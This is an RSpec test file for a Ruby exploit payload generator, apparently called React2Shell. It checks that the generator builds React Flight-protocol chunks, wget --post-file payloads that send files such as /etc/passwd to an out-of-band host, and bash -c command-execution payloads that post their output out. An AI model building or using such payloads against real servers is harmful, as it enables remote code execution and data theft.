# frozen_string_literal: true

require 'spec_helper'
require_relative '../../../lib/react2shell/payload_generator'

RSpec.describe React2Shell::PayloadGenerator do
  let(:generator) { described_class.new }

  describe '#generate_flight_chunk' do
    it 'generates valid JSON for simple payloads' do
      payload = "console.log('test')"
      result = generator.generate_flight_chunk(payload)
      
      expect(result).to be_a(String)
      expect { JSON.parse(result) }.not_to raise_error
    end

    it 'includes required Flight Protocol fields' do
      payload = "test_payload"
      result = generator.generate_flight_chunk(payload)
      chunk = JSON.parse(result)
      
      expect(chunk).to have_key('then')
      expect(chunk).to have_key('status')
      expect(chunk).to have_key('reason')
      expect(chunk).to have_key('value')
      expect(chunk).to have_key('_response')
    end

    it 'properly escapes JavaScript in payload' do
      payload = "console.log('test with quotes')"
      result = generator.generate_flight_chunk(payload)
      
      expect(result).to include("\\\\'")
      expect { JSON.parse(result) }.not_to raise_error
    end
  end

  describe '#create_file_exfiltration_payload' do
    it 'generates wget command for file exfiltration' do
      filepath = '/etc/passwd'
      oob_url = 'http://192.168.1.1:8080/'
      
      result = generator.create_file_exfiltration_payload(filepath, oob_url)
      
      expect(result).to include('wget')
      expect(result).to include('--post-file=')
      expect(result).to include(filepath)
      expect(result).to include(oob_url)
    end

    it 'handles file paths with special characters' do
      filepath = "/tmp/file with spaces.txt"
      oob_url = 'http://192.168.1.1:8080/'
      
      result = generator.create_file_exfiltration_payload(filepath, oob_url)
      
      expect(result).to be_a(String)
      expect(result).to include('wget')
    end
  end

  describe '#create_command_execution_payload' do
    it 'generates command execution payload' do
      command = 'ls -la'
      oob_url = 'http://192.168.1.1:8080/'
      
      result = generator.create_command_execution_payload(command, oob_url)
      
      expect(result).to include('bash -c')
      expect(result).to include(command)
      expect(result).to include('wget')
      expect(result).to include('--post-data=')
    end

    it 'handles commands with special characters' do
      command = 'echo "test with quotes"'
      oob_url = 'http://192.168.1.1:8080/'
      
      result = generator.create_command_execution_payload(command, oob_url)
      
      expect(result).to be_a(String)
      expect(result).to include('bash -c')
    end
  end

  describe '#escape_javascript' do
    it 'escapes single quotes' do
      input = "console.log('test')"
      result = generator.escape_javascript(input)
      
      expect(result).to eq("console.log(\\'test\\')")
    end

    it 'escapes double quotes' do
      input = 'console.log("test")'
      result = generator.escape_javascript(input)
      
      expect(result).to eq('console.log(\\"test\\")')
    end

    it 'escapes newlines and tabs' do
      input = "line1\nline2\tindented"
      result = generator.escape_javascript(input)
      
      expect(result).to eq("line1\\nline2\\tindented")
    end

    it 'handles nil input' do
      result = generator.escape_javascript(nil)
      expect(result).to eq('')
    end
  end

  describe '#escape_shell_parameter' do
    it 'wraps simple strings in quotes' do
      input = 'simple_string'
      result = generator.escape_shell_parameter(input)
      
      expect(result).to eq('simple_string')
    end

    it 'escapes single quotes in shell parameters' do
      input = "string with 'quotes'"
      result = generator.escape_shell_parameter(input)
      
      expect(result).to include("'\"'\"'")
    end

    it 'handles nil input' do
      result = generator.escape_shell_parameter(nil)
      expect(result).to eq('')
    end
  end

  describe '#validate_payload' do
    it 'validates simple payloads as valid' do
      payload = 'console.log("test")'
      result = generator.validate_payload(payload)
      
      expect(result).to be true
    end

    it 'rejects nil or empty payloads' do
      expect(generator.validate_payload(nil)).to be false
      expect(generator.validate_payload('')).to be false
    end

    it 'validates balanced quotes' do
      balanced = 'console.log("test")'
      unbalanced = 'console.log("test)'
      
      expect(generator.validate_payload(balanced)).to be true
      expect(generator.validate_payload(unbalanced)).to be false
    end
  end
end